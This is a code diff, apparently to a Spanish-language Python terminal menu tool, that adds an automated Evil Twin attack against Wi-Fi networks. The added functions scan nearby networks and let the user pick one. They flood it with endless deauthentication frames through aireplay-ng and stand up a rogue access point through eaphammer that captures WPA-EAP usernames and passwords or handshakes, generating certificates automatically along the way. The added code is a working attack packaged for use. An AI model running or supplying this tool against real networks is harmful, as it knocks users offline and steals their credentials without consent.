@@ -517,6 +517,160 @@ def generar_menu_carpetas_wifi():
     
     return menu
 
+#==========================================
+#GESTIÓN DE EVIL TWIN + DEAUTH (OPTIMIZADO)
+#==========================================
+EVIL_STATE = {
+    "station_iface": None,
+    "deauth_iface": None,
+    "target": {},
+    "auth_mode": "wpa-eap",
+    "deauth_mode": "broadcast",
+    "psk_auto": "EvilTwin_Secure_2024!",
+    "pid_deauth": None
+}
+
+def limpiar_ataque_evil():
+    """Detiene procesos y restaura interfaces de forma segura"""
+    print("\n[*] Deteniendo ataque y limpiando procesos...")
+    os.system("sudo pkill -f eaphammer 2>/dev/null")
+    os.system("sudo pkill -f aireplay 2>/dev/null")
+    os.system(f"sudo airmon-ng stop {EVIL_STATE['station_iface']}mon 2>/dev/null || true")
+    os.system(f"sudo airmon-ng stop {EVIL_STATE['deauth_iface']}mon 2>/dev/null || true")
+    os.system("sudo systemctl restart NetworkManager 2>/dev/null 2>&1")
+    print("[+] Limpieza completada. Interfaces restauradas a modo Managed.")
+
+def verificar_certificados_auto():
+    """Genera certificados de forma no interactiva si faltan"""
+    cert_dir = "/usr/share/eaphammer/certs"
+    os.makedirs(cert_dir, exist_ok=True)
+    if not os.path.exists(f"{cert_dir}/server.pem") or not os.path.exists(f"{cert_dir}/dh"):
+        print("[!] Certificados no encontrados. Generando automáticamente...")
+        os.system(f"sudo openssl req -x509 -newkey rsa:2048 -keyout {cert_dir}/key.pem -out {cert_dir}/cert.pem -days 365 -nodes -subj '/CN=EvilTwin' 2>/dev/null")
+        os.system(f"sudo cat {cert_dir}/cert.pem {cert_dir}/key.pem | sudo tee {cert_dir}/server.pem > /dev/null 2>&1")
+        os.system(f"sudo openssl dhparam -out {cert_dir}/dh 2048 2>/dev/null")
+        print("[✓] Certificados generados correctamente.")
+    else:
+        print("[✓] Certificados válidos encontrados.")
+
+def generar_menu_interfaces_evil():
+    """Menú 1: Seleccionar las dos interfaces (AP y Deauth)"""
+    menu = Menu("SELECCIONAR INTERFACES EVIL TWIN")
+    interfaces = obtener_interfaces()
+    if len(interfaces) < 2:
+        menu.agregar_opcion("Error: Se requieren mínimo 2 adaptadores WiFi", AccionBash("Error", "echo 'Conecta una segunda tarjeta USB WiFi.'"))
+        return menu
+
+    for iface in interfaces:
+        menu.agregar_opcion(f"1. Interfaz AP Malicioso: {iface}", 
+                            AccionMenuDinamico("Set AP", lambda i=iface: generar_menu_deauth_evil(i)))
+    return menu
+
+def generar_menu_deauth_evil(station_iface):
+    EVIL_STATE["station_iface"] = station_iface
+    menu = Menu(f"SELECCIONAR INTERFAZ DEAUTH (AP: {station_iface})")
+    interfaces = obtener_interfaces()
+    for iface in interfaces:
+        if iface != station_iface:
+            menu.agregar_opcion(f"2. Interfaz Deauth: {iface}", 
+                                AccionMenuDinamico("Set Deauth", lambda i=iface: escanear_redes_evil(i)))
+    return menu
+
+def escanear_redes_evil(deauth_iface):
+    EVIL_STATE["deauth_iface"] = deauth_iface
+    curses.endwin()
+    os.system('clear')
+    print(f"[*] Escaneando redes en {deauth_iface} (10 seg)...")
+    print("[!] Espera a que termine el escaneo. Seleccionarás la red en el siguiente menú.")
+    
+    os.system(f"sudo airmon-ng start {deauth_iface} > /dev/null 2>&1")
+    scan_file = "/tmp/evil_scan"
+    os.system(f"sudo rm -f {scan_file}-01.csv")
+    os.system(f"sudo timeout 10s airodump-ng {deauth_iface} -w {scan_file} --output-format csv > /dev/null 2>&1")
+
+    redes = []
+    try:
+        with open(f"{scan_file}-01.csv", "r", errors="ignore") as f:
+            partes = f.read().split("Station MAC,")
+            lineas = partes[0].split("\n")[2:]
+            for l in lineas:
+                r = l.split(",")
+                if len(r) >= 14 and ":" in r[0]:
+                    redes.append({"bssid": r[0].strip(), "ch": r[3].strip(),
+                                  "essid": r[13].strip() if r[13].strip() else "<Oculta>"})
+    except: pass
+
+    if not redes:
+        menu_err = Menu("ERROR ESCANEO")
+        menu_err.agregar_opcion("No se detectaron redes. (Regresar)", AccionBash("Info", "echo 'Intenta de nuevo o acércate.'"))
+        return menu_err
+
+    menu_red = Menu("SELECCIONAR RED OBJETIVO")
+    for red in redes:
+        menu_red.agregar_opcion(f"{red['essid']} (CH:{red['ch']} | {red['bssid']})", 
+                                AccionMenuDinamico("Target Set", lambda r=red: configurar_ataque_evil(r)))
+    return menu_red
+
+def configurar_ataque_evil(target):
+    EVIL_STATE["target"] = target
+    menu = Menu(f"CONFIGURAR ATAQUE: {target['essid']}")
+    menu.agregar_opcion("Modo: WPA-EAP (Captura Usuario + Contraseña)", 
+                        AccionMenuDinamico("Set EAP", lambda: seleccionar_deauth_evil("wpa-eap")))
+    menu.agregar_opcion("Modo: WPA-PSK (Captura Handshake con PSK auto-generada)", 
+                        AccionMenuDinamico("Set PSK", lambda: seleccionar_deauth_evil("wpa-psk")))
+    return menu
+
+def seleccionar_deauth_evil(auth_mode):
+    EVIL_STATE["auth_mode"] = auth_mode
+    menu = Menu("TIPO DE DEAUTHENTICATION")
+    menu.agregar_opcion("Broadcast (Desconectar todos los clientes)", 
+                        AccionMenuDinamico("Set Broadcast", lambda: ejecutar_ataque_evil("broadcast")))
+    menu.agregar_opcion("Dirigido (Desconectar AP general -0)", 
+                        AccionMenuDinamico("Set Directed", lambda: ejecutar_ataque_evil("directed")))
+    return menu
+
+def ejecutar_ataque_evil(deauth_mode):
+    EVIL_STATE["deauth_mode"] = deauth_mode
+    limpiar_ataque_evil()
+    curses.endwin()
+    os.system('clear')
+
+    verificar_certificados_auto()
+    
+    target = EVIL_STATE["target"]
+    station = EVIL_STATE["station_iface"]
+    deauth = EVIL_STATE["deauth_iface"]
+    auth = EVIL_STATE["auth_mode"]
+
+    print("="*60)
+    print("[!] EJECUTANDO ATAQUE EVIL TWIN + DEAUTH AUTOMÁTICO")
+    print(f"    AP Malicioso : {station}")
+    print(f"    Interfaz Deauth: {deauth}")
+    print(f"    Red Objetivo : {target['essid']} ({target['bssid']}) CH:{target['ch']}")
+    print(f"    Autenticación: {auth.upper()}")
+    print(f"    Deauth Mode  : {deauth_mode.upper()}")
+    print("="*60)
+    
+    time.sleep(3) # Auto-inicio sin input()
+
+    try:
+        print("[*] Iniciando Deauthentication en segundo plano...")
+        os.system(f"sudo aireplay-ng --deauth 0 -a {target['bssid']} {deauth} > /dev/null 2>&1 &")
+        time.sleep(3)
+
+        print(f"[*] Lanzando Evil Twin con Eaphammer...")
+        cmd = f"sudo eaphammer -i {station} --channel {target['ch']} --essid \"{target['essid']}\" --auth {auth} "
+        cmd += "--creds " if auth == "wpa-eap" else f"--wpa-passphrase \"{EVIL_STATE['psk_auto']}\" "
+        
+        print(f"[*] Credenciales capturadas se guardarán en: /tmp/eaphammer/")
+        subprocess.run(cmd, shell=True)
+    except KeyboardInterrupt:
+        print("\n[!] Ataque interrumpido manualmente.")
+    finally:
+        limpiar_ataque_evil()
+        print("\n[Presiona ENTER para regresar al menú principal]")
+        input()
+
 
 # ==========================================
 # 6. ÁRBOL DE MENÚS Y COMPILACIÓN
@@ -569,7 +723,7 @@ def main(stdscr):
     menu_wireless.agregar_opcion("1. Activar Modo Monitor (Seleccionar Interfaz)", AccionMenuDinamico("Modo Monitor", generar_menu_monitor))
     menu_wireless.agregar_opcion("2. Iniciar Captura Automatizada de Handshake", AccionMenuDinamico("Seleccionar Interfaz", generar_menu_interfaces_captura))
     menu_wireless.agregar_opcion("3. Explorador de Capturas (Visor TUI y Ranger)", AccionMenuDinamico("Explorador WiFi", generar_menu_carpetas_wifi))
-
+    menu_wireless.agregar_opcion("4. Ataque Evil Twin + Deauth (Automático) ", AccionMenuDinamico("Evil Twin", generar_menu_interfaces_evil))
 
 
 
